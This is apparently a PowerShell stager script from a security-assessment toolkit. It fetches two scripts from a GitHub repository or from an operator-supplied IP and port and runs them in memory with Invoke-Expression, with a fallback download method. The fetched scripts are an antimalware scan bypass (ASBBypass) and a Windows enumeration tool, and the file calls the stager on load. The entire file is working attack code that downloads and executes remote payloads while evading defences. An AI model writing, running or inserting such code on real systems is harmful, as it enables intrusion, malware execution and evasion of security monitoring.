function Invoke-Stager{
    param(
        [string]$IP,
        [string]$Port='80'
    )
    if(-not($IP)){
        $Address='https://raw.githubusercontent.com/cube0x0/Security-Assessment/master/Testing'
    }else{
        $Address = "http://$IP:$Port"
    }
    try{
        Invoke-Expression (New-Object net.webclient).DownloadString("$Address/ASBBypass.ps1") | Out-Null
        Invoke-Expression (New-Object net.webclient).DownloadString("$Address/Invoke-WinEnum.ps1")
        $check=$true
    }catch{
        Write-Output "[-] $($_.Exception.Message)"
        Write-Output "[-] Invoke-Expression (New-Object net.webclient).DownloadString Failed"
    }
    if(-not($check)){
        try{
            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri "$Address/ASBBypass.ps1").content
            Invoke-Expression (Invoke-WebRequest -UseBasicParsing -Uri "$Address/Invoke-WinEnum.ps1").content 
        }catch{
            Write-Output "[-] $($_.Exception.Message)"
            Write-Output "[-] Invoke-WebRequest Failed"
            return
        }
    }
    Invoke-Bypass | Out-Null
    Invoke-WinEnum
}
Invoke-Stager
